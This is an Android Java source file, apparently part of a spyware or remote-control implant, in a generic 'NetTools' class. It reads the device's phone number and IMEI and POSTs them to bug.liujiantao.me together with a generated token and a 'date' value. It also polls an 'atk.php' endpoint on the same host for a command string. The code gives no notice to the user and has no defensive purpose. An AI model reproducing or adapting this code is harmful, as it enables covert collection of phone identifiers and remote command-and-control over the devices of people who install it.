package x;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/**
 * Created by asus on 15-7-6.
 */
public class NetTools {

    public static String getToken(int length) { //length表示生成字符串的长度
        String base = "abcdefghijklmnopqrstuvwxyz0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; i++) {
            int number = random.nextInt(base.length());
            sb.append(base.charAt(number));
        }
        return sb.toString();
    }

  public static void sendDate(Context c,String date){
      SharedPreferences u=c.getSharedPreferences("basic",Context.MODE_PRIVATE);
      List<NameValuePair> params = new ArrayList<NameValuePair>();
      params.add(new BasicNameValuePair("token",u.getString("token","")));
      params.add(new BasicNameValuePair("imei", ((TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId()));
      params.add(new BasicNameValuePair("date",date));
      doPost(params,"http://bug.liujiantao.me/post.php");
  }
    public static void sendIMEI(Context c){
        SharedPreferences u=c.getSharedPreferences("basic",Context.MODE_PRIVATE);
        SharedPreferences.Editor se=u.edit();
        se.commit();
        String token=getToken(16);
        TelephonyManager tm=(TelephonyManager)c.getSystemService(Context.TELEPHONY_SERVICE);
        String number = tm.getLine1Number();

        se.putString("token",token);
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("phonenumber", number));
        params.add(new BasicNameValuePair("imei", ((TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId()));
        params.add(new BasicNameValuePair("token",token));
        doPost(params,"http://bug.liujiantao.me/first.php");
    }

    public static String getCommand(){
        JSONObject jsonObject=null;
        HttpClient client = new DefaultHttpClient();
        StringBuilder builder = new StringBuilder();
        HttpGet myget = new HttpGet("http://bug.liujiantao.me/atk.php");
        try {
            HttpResponse response = client.execute(myget);
            HttpEntity entity = response.getEntity();
            BufferedReader reader = new BufferedReader(new InputStreamReader(entity.getContent()));
            for (String s = reader.readLine(); s != null; s = reader.readLine()) {
                builder.append(s);
            }
            Log.i("tttttt", builder.toString());
            jsonObject = new JSONObject(builder.toString());

            return jsonObject.getString("1");
        }catch(Exception e){

            return "";
        }
    }
  private static void doPost(List<NameValuePair> params ,String address){

      HttpPost httpRequest = new HttpPost(address);
      try
      {
          httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
          HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);

      }
      catch (ClientProtocolException e)
      {
          e.printStackTrace();
      }
      catch (IOException e)
      {

          e.printStackTrace();
      }
      catch (Exception e)
      {
          e.printStackTrace();
      }
  }
}
